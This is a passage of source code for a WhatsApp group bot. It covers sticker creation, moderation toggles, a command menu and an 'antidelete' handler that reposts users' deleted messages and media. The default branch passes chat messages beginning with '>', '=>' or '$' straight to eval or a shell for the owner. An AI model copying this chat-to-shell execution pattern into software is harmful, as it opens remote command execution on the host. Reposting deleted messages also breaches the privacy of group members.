      ctx.font = `bold ${fontSize}px Arial`
      lines = wrapText(ctx, text, maxWidth)
      const height = lines.length * (fontSize * 1.35)
      if (height < maxHeight) break
      fontSize -= 2
    }

    return { fontSize, lines }
  }

  try {
    const img = await loadImage(IMG)
    const canvas = createCanvas(img.width, img.height)
    const ctx = canvas.getContext("2d")

    ctx.drawImage(img, 0, 0)

    const board = { 
      x: 420,
      y: 415,
      w: 270,
      h: 410
    }

    ctx.fillStyle = "black"
    ctx.textAlign = "center"
    ctx.textBaseline = "middle"

    const { fontSize, lines } = fitText(ctx, text, board.w, board.h)
    ctx.font = `bold ${fontSize}px Arial`

    const lineHeight = fontSize * 1.35
    const totalHeight = lines.length * lineHeight
    const centerX = board.x + board.w / 2
    const centerY = board.y + board.h / 2
    let startY = centerY - totalHeight / 2 + lineHeight / 2

    lines.forEach((line, i) => {
      ctx.fillText(line, centerX, startY + i * lineHeight)
    })

    const buffer = canvas.toBuffer("image/webp")

    const sticker = new Sticker(buffer, {
      pack: "Bahlil Meme",
      author: "LE SEIGNEUR DES APPAREILS 🇷🇴",
      type: "full",
      quality: 90
    })

    const stiker = await sticker.toMessage()
    await Xuu.sendMessage(m.chat, stiker, { quoted: m })

  } catch (e) {
    console.log(e)
    reply("Échec membuat stiker.")
  }
}
break;


case 'antilinkch': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
if (!text) return m.reply(`👑 *Exemple penggunaan :*
ketik antilinkch on/off`)
const isAntilinkch = Antilinkch.includes(m.chat)
if (text == "on") {
if (isAntilinkch) return m.reply(`👑 Antilinkch di groupes ini sudah aktif!`)
Antilinkch.push(m.chat)
await fs.writeFileSync("./library/database/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return m.reply(`👑 Antilinkch réussi diaktifkan ✅`)
}
if (text == "off") {
if (!isAntilinkch) return m.reply(`👑 Antilinkch di groupes ini sudah tidak aktif!`)
 const posisi = Antilinkch.indexOf(m.chat)
Antilinkch.splice(posisi, 1)
await fs.writeFileSync("./library/database/antilinkch.json", JSON.stringify(Antilinkch, null, 2))
return m.reply(`👑 Antilinkch réussi dimatikan ✅`)
}
}
break;


case 'antikataunchek': {
  if (!isCreator) return m.reply(mess.owner)
  if (!m.isGroup) return m.reply(mess.group)
  if (!text) return m.reply(`👑 *Exemple penggunaan :*\nketik ${cmd} on/off`)

  const isAntikataunchek = Antikataunchek.includes(m.chat)

  if (text == "on") {
    if (isAntikataunchek) return m.reply(`👑 Antikataunchek di groupes ini sudah aktif!`)
    Antikataunchek.push(m.chat)
    await fs.writeFileSync("./library/database/antikataunchek.json", JSON.stringify(Antikataunchek, null, 2))
    return m.reply(`👑 Antikataunchek réussi diaktifkan ✅`)
  }

  if (text == "off") {
    if (!isAntikataunchek) return m.reply(`👑 Antikataunchek di groupes ini sudah tidak aktif!`)
    const posisi = Antikataunchek.indexOf(m.chat)
    Antikataunchek.splice(posisi, 1)
    await fs.writeFileSync("./library/database/antikataunchek.json", JSON.stringify(Antikataunchek, null, 2))
    return m.reply(`👑 Antikataunchek réussi dimatikan ✅`)
  }
}
break


case 'antino': {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antino.includes(m.chat)) return m.reply("*Anti Nomor HP* Di Grup Ini Sudah Aktif!")
        antino.push(m.chat)
        await fs.writeFileSync("./library/database/antino.json", JSON.stringify(antino))
        m.reply("*👑 Opération réalisée avec succès Menyalakan Anti Nomor HP Di Grup ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antino.includes(m.chat)) return m.reply("*Anti Nomor HP* Di Grup Ini Belum Aktif!")
        let posi = antino.indexOf(m.chat)
        antino.splice(posi, 1)
        await fs.writeFileSync("./library/database/antino.json", JSON.stringify(antino))
        m.reply("*👑 Opération réalisée avec succès Mematikan Anti Nomor HP* ✅")
    } else {
        return m.reply(example("on/off"))
    }
}
break;

case 'antilinktele': {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antitele.includes(m.chat)) return m.reply("*Anti Link Telegram* Di Grup Ini Sudah Aktif!")
        antitele.push(m.chat)
        await fs.writeFileSync("./library/database/antitele.json", JSON.stringify(antitele))
        m.reply("*👑 Opération réalisée avec succès Menyalakan Anti Link Telegram Di Grup ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antitele.includes(m.chat)) return m.reply("*Anti Link Telegram* Di Grup Ini Belum Aktif!")
        let posi = antitele.indexOf(m.chat)
        antitele.splice(posi, 1)
        await fs.writeFileSync("./library/database/antitele.json", JSON.stringify(antitele))
        m.reply("*👑 Opération réalisée avec succès Mematikan Anti Link Telegram* ✅")
    } else {
        return m.reply(example("on/off"))
    }
}
break;




// ✅ ═══════════════════════════════════════
//    ANTIDELETE — Commande .antidelete
// ═══════════════════════════════════════
case 'antidelete': {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(`👑 *Exemple :*
*.antidelete on* — Activer
*.antidelete off* — Désactiver`)

    if (/on/.test(args[0].toLowerCase())) {
        if (antidelete.includes(m.chat)) return m.reply("*Antidelete* est déjà *activé* dans ce groupe !")
        antidelete.push(m.chat)
        fs.writeFileSync(antideletePath, JSON.stringify(antidelete))
        m.reply(`*✅ Antidelete activé !*

Tout message supprimé dans ce groupe sera révélé automatiquement par le bot.`)
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antidelete.includes(m.chat)) return m.reply("*Antidelete* est déjà *désactivé* dans ce groupe !")
        const pos = antidelete.indexOf(m.chat)
        antidelete.splice(pos, 1)
        fs.writeFileSync(antideletePath, JSON.stringify(antidelete))
        m.reply(`*✅ Antidelete désactivé !*`)
    } else {
        return m.reply(`👑 Usage : *.antidelete on/off*`)
    }
}
break;
case 'antimediafire': {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antimediafire.includes(m.chat)) return m.reply("*Anti Link Mediafire* Di Grup Ini Sudah Aktif!")
        antimediafire.push(m.chat)
        await fs.writeFileSync("./library/database/antimediafire.json", JSON.stringify(antimediafire))
        m.reply("*👑 Opération réalisée avec succès Menyalakan Anti Link Mediafire Di Grup ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antimediafire.includes(m.chat)) return m.reply("*Anti Link Mediafire* Di Grup Ini Belum Aktif!")
        let posi = antimediafire.indexOf(m.chat)
        antimediafire.splice(posi, 1)
        await fs.writeFileSync("./library/database/antimediafire.json", JSON.stringify(antimediafire))
        m.reply("*👑 Opération réalisée avec succès Mematikan Anti Link Mediafire* ✅")
    } else {
        return m.reply(example("on/off"))
    }
}
break;


case "antitoxic": {
    if (!isGroup) return m.reply(mess.group)
    if (!isOwner && !isAdmin) return m.reply(mess.admin)
    if (!args[0]) return m.reply(example("on/off"))
    
    if (/on/.test(args[0].toLowerCase())) {
        if (antitoxic.includes(m.chat)) return m.reply("*Anti Toxic* sudah aktif di groupes ini!")
        antitoxic.push(m.chat)
        await fs.writeFileSync("./library/database/antitoxic.json", JSON.stringify(antitoxic))
        m.reply("*👑 Opération réalisée avec succès Menyalakan Anti Toxic ✅*")
    } else if (/off/.test(args[0].toLowerCase())) {
        if (!antitoxic.includes(m.chat)) return m.reply("*Anti Toxic* belum aktif di groupes ini!")
        let posi = antitoxic.indexOf(m.chat)
        antitoxic.splice(posi, 1)
        await fs.writeFileSync("./library/database/antitoxic.json", JSON.stringify(antitoxic))
        m.reply("*👑 Opération réalisée avec succès Mematikan Anti Toxic ✅*")
    } else {
        return m.reply(example("on/off"))
    }
}
break
//~~~~~~ ( end case ) ~~~~~~~//

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (m.text.toLowerCase() == "bot") {
reply("Online ✅")
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`👑 ${err}`)
if (stdout) return m.reply(stdout)
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
break;

case 'menu': {

let teks = `
░▒▓█  𝗟𝗘 𝗦𝗘𝗜𝗚𝗡𝗘𝗨𝗥 🇷🇴  █▓▒░

╭──〔 👑 𝗔𝗗𝗠𝗜𝗡 〕
├ addcase
├ delcase
├ renamecase
├ listadmin
├ trxon
├ trxoff
├ owneron
├ owneroff
├ block
├ unblok
├ clsesi
├ svsc
├ listsc
├ sendsc
├ getsc
├ delsc
├ addsewa
├ testi
├ update
╰───────────────

╭──〔 📥 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗 〕
├ play
├ playvid
├ ytmp4
├ tiktok
├ ttmp3
├ ttaudio
├ facebook
├ fbdl
├ instagram
├ igdl
├ mediafire
├ snackvideo
╰───────────────

╭──〔 👥 𝗚𝗥𝗢𝗨𝗣𝗘 〕
├ idgc
├ listgc
├ opentime
├ closetime
├ delete
├ antilinkwame
├ swgrup
╰───────────────

╭──〔 🖼 𝗜𝗠𝗔𝗚𝗘 & 𝗧𝗢𝗢𝗟𝗦 〕
├ pin
├ iqc
├ iqc2
├ tobase64
├ toraw
├ tourlph
├ pastebin
╰───────────────

  © 2026 | 𝗟𝗘 𝗦𝗘𝗜𝗚𝗡𝗘𝗨𝗥
`

await Xuu.sendMessage(m.chat, {
    text: teks,
    mentions: [m.sender],
    contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"],
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363422398514286@newsletter',
            newsletterName: global.nomSaluran
        },
        externalAdReply: {
            title: `🚀 ${global.botname2} - Premium WhatsApp Bot`,
            body: `SEIGNEUR TD 🇷🇴 V 1.0.0`,
            thumbnailUrl: global.image.menu,
            sourceUrl: global.linkWebsite,
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true
        }
    }
}, { quoted: m })

}
break;
//━━━━━━━━━━━━━━━━━━━━━━━━━━━//

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
}
} catch (err) {
console.log(util.format(err));
}}

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

// ✅ ═══════════════════════════════════════════════════════════
//    ANTIDELETE — Handler de suppression de messages
//    Exporte la fonction pour être appelée dans start.js
// ═══════════════════════════════════════════════════════════════
module.exports.handleDelete = async (Xuu, update) => {
    try {
        for (const item of update) {
            // Vérifie si ce chat a l'antidelete activé
            if (!antidelete.includes(item.remoteJid)) continue
            // Ignore les suppressions du bot lui-même
            if (item.fromMe) continue
            // Cherche le message original dans le store
            const stored = msgStore[item.id]
            if (!stored) continue
            const msg = stored.message
            const senderNum = stored.sender?.split("@")[0] || "inconnu"
            const chat = stored.chat
            // Récupère le contenu du message supprimé
            const type = Object.keys(msg)[0]
            const content = msg[type]
            if (type === "conversation" || type === "extendedTextMessage") {
                const texte = content?.text || content || ""
                await Xuu.sendMessage(chat, {
                    text: `🗑️ *Message supprimé détecté !*

👤 *Auteur :* @${senderNum}
💬 *Message :* ${texte}`,
                    mentions: [stored.sender]
                })
            } else if (type === "imageMessage") {
                try {
                    const buf = await Xuu.downloadMediaMessage({ message: msg })
                    await Xuu.sendMessage(chat, {
                        image: buf,
                        caption: `🗑️ *Image supprimée détectée !*
👤 *Auteur :* @${senderNum}
📝 *Légende :* ${content?.caption || ""}`,
                        mentions: [stored.sender]
                    })
                } catch(e) {}
            } else if (type === "videoMessage") {
                try {
                    const buf = await Xuu.downloadMediaMessage({ message: msg })
                    await Xuu.sendMessage(chat, {
                        video: buf,
                        caption: `🗑️ *Vidéo supprimée détectée !*
👤 *Auteur :* @${senderNum}`,
                        mentions: [stored.sender]
                    })
                } catch(e) {}
            } else if (type === "audioMessage") {
                try {
                    const buf = await Xuu.downloadMediaMessage({ message: msg })
                    await Xuu.sendMessage(chat, {
                        audio: buf,
                        mimetype: content?.mimetype || "audio/ogg; codecs=opus",
                        ptt: content?.ptt || false
                    })
                    await Xuu.sendMessage(chat, {
                        text: `🗑️ *Audio supprimé détecté !*
👤 *Auteur :* @${senderNum}`,
                        mentions: [stored.sender]
                    })
                } catch(e) {}
            } else if (type === "stickerMessage") {
                try {
                    const buf = await Xuu.downloadMediaMessage({ message: msg })
                    await Xuu.sendMessage(chat, { sticker: buf })
                    await Xuu.sendMessage(chat, {
                        text: `🗑️ *Sticker supprimé détecté !*
👤 *Auteur :* @${senderNum}`,
                        mentions: [stored.sender]
                    })
                } catch(e) {}
            }
        }
    } catch(e) {
        console.log("[ANTIDELETE ERROR]", e.message)
    }
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});
